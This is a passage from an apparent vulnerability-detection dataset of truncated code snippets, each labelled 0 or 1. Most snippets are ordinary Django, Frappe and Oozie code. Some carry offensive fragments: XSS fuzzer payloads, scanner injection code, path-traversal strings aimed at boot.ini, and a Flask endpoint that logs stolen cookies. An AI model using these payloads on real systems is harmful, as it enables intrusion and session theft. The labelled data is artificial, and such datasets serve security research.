'action': reverse('oozie:editor_submit_workflow", "label": 0}, {"snippet_id": 53227, "code": ") params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id", "label": 0}, {"snippet_id": 28395, "code": "') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import", "label": 0}, {"snippet_id": 53728, "code": "(application_name, default_region) fh=open(dest, 'w') fh.write(contents) fh.close() if __name__=='__main__': parser=argparse.ArgumentParser(description='EB Config Maker') parser.add_argument('--dest', type=str,", "label": 0}, {"snippet_id": 11384, "code": "'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ", "label": 0}, {"snippet_id": 5482, "code": "'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> ", "label": 0}, {"snippet_id": 8286, "code": "(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth", "label": 0}, {"snippet_id": 9727, "code": "'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login", "label": 0}, {"snippet_id": 4647, "code": "'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', ", "label": 0}, {"snippet_id": 23636, "code": "(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views", "label": 0}, {"snippet_id": 15089, "code": ".get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'", "label": 0}, {"snippet_id": 50108, "code": ".last_alive.iteritems() if now -t > _KEEPALIVE) for csessid, remove in keep_alives: if remove: to_remove.append(csessid) else: self.last_alive[csessid]=(now, True) self.lineSend(csessid,[\"ajax_keepalive\"", "label": 0}, {"snippet_id": 4326, "code": " payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return", "label": 0}, {"snippet_id": 20069, "code": "=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes ", "label": 0}, {"snippet_id": 5490, "code": ", 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s ", "label": 0}, {"snippet_id": 41753, "code": "\tself.set(key, d.get(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\"", "label": 0}, {"snippet_id": 44862, "code": "(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type=", "label": 0}, {"snippet_id": 37535, "code": "=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog", "label": 0}, {"snippet_id": 3644, "code": " xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT':", "label": 0}, {"snippet_id": 39319, "code": "=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self", "label": 0}, {"snippet_id": 55079, "code": ".filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects=Project.objects.filter", "label": 0}, {"snippet_id": 40839, "code": "(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":[\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)", "label": 0}, {"snippet_id": 50051, "code": "(obj, ensure_ascii=False, cls=LazyEncoder)) class AjaxWebClient(resource.Resource): \"\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={", "label": 0}, {"snippet_id": 12727, "code": "+=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo", "label": 0}, {"snippet_id": 12142, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^", "label": 1}, {"snippet_id": 52321, "code": ".')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get(", "label": 0}, {"snippet_id": 47888, "code": " set password for: \" +user.displayName) au.email=mail au.save() user.save() else: username=str(request.POST[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes", "label": 1}, {"snippet_id": 11815, "code": "'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$", "label": 0}, {"snippet_id": 38558, "code": ".replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError", "label": 0}, {"snippet_id": 48828, "code": "='__str__': return self.model._meta.verbose_name.title() try: field=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field) and getattr(field,", "label": 0}, {"snippet_id": 4989, "code": "'<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version", "label": 0}, {"snippet_id": 27120, "code": " and len(params) > 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter", "label": 1}, {"snippet_id": 19762, "code": ".g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary", "label": 0}, {"snippet_id": 54519, "code": " FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm): class Meta: model=Article fields=['title", "label": 0}, {"snippet_id": 52080, "code": "=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow", "label": 0}, {"snippet_id": 37353, "code": ", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context", "label": 0}, {"snippet_id": 49930, "code": " /webclient -this url is handled through django's template system and serves the html page for the client itself along with its javascript chat program. /webclientdata -this url is called by the ajax chat", "label": 0}, {"snippet_id": 53822, "code": "(input(\"[Input Dork] >_ \")) req=url.PoolManager() send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link", "label": 1}, {"snippet_id": 42251, "code": " self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\",", "label": 0}, {"snippet_id": 49729, "code": ",redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print ", "label": 1}, {"snippet_id": 38918, "code": "\t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype(key) \t\t\t\tif not value[\"doctype\"]: \t\t\t\t\traise AttributeError(key) \t\t\tvalue=get_controller", "label": 0}, {"snippet_id": 43638, "code": ", self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value", "label": 0}, {"snippet_id": 24483, "code": " self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots', False", "label": 0}, {"snippet_id": 42332, "code": ".as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t", "label": 0}, {"snippet_id": 9431, "code": "]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 8465, "code": " settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding", "label": 0}, {"snippet_id": 10145, "code": " test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 4801, "code": " html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=", "label": 0}, {"snippet_id": 52622, "code": ".do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']==", "label": 0}, {"snippet_id": 19183, "code": " \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js'", "label": 0}, {"snippet_id": 42856, "code": "\t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in", "label": 0}, {"snippet_id": 36463, "code": ".fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype", "label": 0}, {"snippet_id": 53016, "code": "(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) })", "label": 1}, {"snippet_id": 26660, "code": "./../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 1748, "code": "<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('", "label": 0}, {"snippet_id": 53931, "code": "']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------------------------", "label": 0}, {"snippet_id": 53024, "code": " doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def", "label": 0}, {"snippet_id": 29869, "code": "\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') \t\t if form.getvalue('getcert') is not None and serv is not None: ", "label": 0}, {"snippet_id": 10497, "code": "-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self", "label": 0}, {"snippet_id": 37487, "code": "(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger", "label": 0}, {"snippet_id": 48506, "code": ": return HttpResponseRedirect(\"/admin?error=noyb\") current_reservation.submitted=True current_reservation.save() res: HttpResponseRedirect=HttpResponseRedirect(forward_url) return res def manipulate_reservation_action", "label": 0}, {"snippet_id": 31565, "code": ".index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1", "label": 0}, {"snippet_id": 19993, "code": "('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__", "label": 0}, {"snippet_id": 2237, "code": " xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query", "label": 0}, {"snippet_id": 6332, "code": ") @property def pysaml2_config(self): \"\"\" pysaml2 configuration file. Separate config file with SAML related parameters. \"\"\" return self.config.get(self.section, 'pysaml2_config') @property def fticks_secret_key", "label": 0}, {"snippet_id": 2591, "code": "\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads", "label": 0}, {"snippet_id": 5200, "code": "=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload", "label": 0}, {"snippet_id": 14799, "code": ".env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir", "label": 1}, {"snippet_id": 51812, "code": " a new key. Instructions are listed here:' 'https://github.com/pyca/cryptography. In short, run: key=Fernet.generate_key()') LOGGING={ 'version': 1, 'disable_existing_loggers': False, 'handlers':{ 'console", "label": 0}, {"snippet_id": 6834, "code": " 'max_authn_failures_per_month') @property def login_state_ttl(self): \"\"\" Lifetime of state kept in IdP login phase. This is the time, in minutes, a user has to complete the login phase. After this time", "label": 0}, {"snippet_id": 35108, "code": "(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message(self, e): \t\ttype, value, traceback=sys.exc_info() \t\tfieldname, label=str(e).split(\"'\")[-2],", "label": 0}, {"snippet_id": 35387, "code": "\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self", "label": 0}, {"snippet_id": 52355, "code": ".objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc,", "label": 0}, {"snippet_id": 29202, "code": "\thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in", "label": 0}, {"snippet_id": 44333, "code": ".error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json", "label": 1}, {"snippet_id": 26024, "code": " labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional", "label": 0}, {"snippet_id": 48401, "code": ") not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount > 0: ar=ArticleRequested() ar.AID", "label": 0}, {"snippet_id": 38417, "code": ".comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t", "label": 0}, {"snippet_id": 24056, "code": " to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200", "label": 0}, {"snippet_id": 42654, "code": " \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t\t\t\tself.set", "label": 0}, {"snippet_id": 11011, "code": "-fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo", "label": 0}, {"snippet_id": 35655, "code": "=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t", "label": 0}, {"snippet_id": 36045, "code": " df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and not self.is_dummy_password(self.get", "label": 0}, {"snippet_id": 562, "code": " if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result=", "label": 1}, {"snippet_id": 27590, "code": "=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email: self.redirect(login_url) return contact_string=db_config.get_value('contact_string') template_values={ 'message':", "label": 0}, {"snippet_id": 21044, "code": "),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views", "label": 0}, {"snippet_id": 3723, "code": "'application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote", "label": 0}, {"snippet_id": 13738, "code": ")/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter", "label": 1}, {"snippet_id": 2138, "code": "//\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if", "label": 0}, {"snippet_id": 17162, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 2063, "code": " decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via", "label": 0}, {"snippet_id": 38483, "code": " display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"", "label": 0}, {"snippet_id": 60, "code": "/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse", "label": 1}, {"snippet_id": 7838, "code": ".grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 55139, "code": " request.user, active_translations, locale, ) if action_status.get('error'): return JsonResponse(action_status) invalid_translation_count=len(action_status.get('invalid_translation_pks',[])) if action_status", "label": 0}, {"snippet_id": 40495, "code": "=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf", "label": 0}, {"snippet_id": 37812, "code": " Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" ", "label": 0}, {"snippet_id": 27043, "code": "{} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name", "label": 0}, {"snippet_id": 20613, "code": ") urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard", "label": 0}, {"snippet_id": 36729, "code": ".blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t", "label": 0}, {"snippet_id": 21149, "code": "', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 42154, "code": "\telif df.fieldtype in(\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":", "label": 0}, {"snippet_id": 34831, "code": "() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields", "label": 0}, {"snippet_id": 42271, "code": "\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn", "label": 0}, {"snippet_id": 14258, "code": "'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 45939, "code": " import Collection2 from dashboard.conf import get_engines from dashboard.controller import DashboardController, can_edit_index LOG=logging.getLogger(__name__) DEFAULT_LAYOUT=[ {\"size\":2,\"rows\":[{\"widgets", "label": 0}, {"snippet_id": 28360, "code": "\t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn", "label": 0}, {"snippet_id": 5127, "code": " self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +='", "label": 0}, {"snippet_id": 22122, "code": " url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 11698, "code": "'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=", "label": 0}, {"snippet_id": 18467, "code": "'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 4719, "code": "'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout", "label": 0}, {"snippet_id": 890, "code": "']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=',", "label": 1}, {"snippet_id": 53758, "code": ") parser.add_argument('--name', type=str, required=True, help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region') args=parser.parse_args", "label": 0}, {"snippet_id": 22738, "code": "\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info", "label": 0}, {"snippet_id": 9679, "code": "),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns", "label": 0}, {"snippet_id": 17835, "code": "/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name", "label": 0}, {"snippet_id": 47665, "code": " blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content(PasswordField(name='password', required=False)) f.add_content(PlainText('Confirm your password", "label": 0}, {"snippet_id": 24690, "code": "-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green", "label": 0}, {"snippet_id": 39847, "code": ".is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name: \t\t\t\t", "label": 0}, {"snippet_id": 22927, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 47725, "code": " False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def", "label": 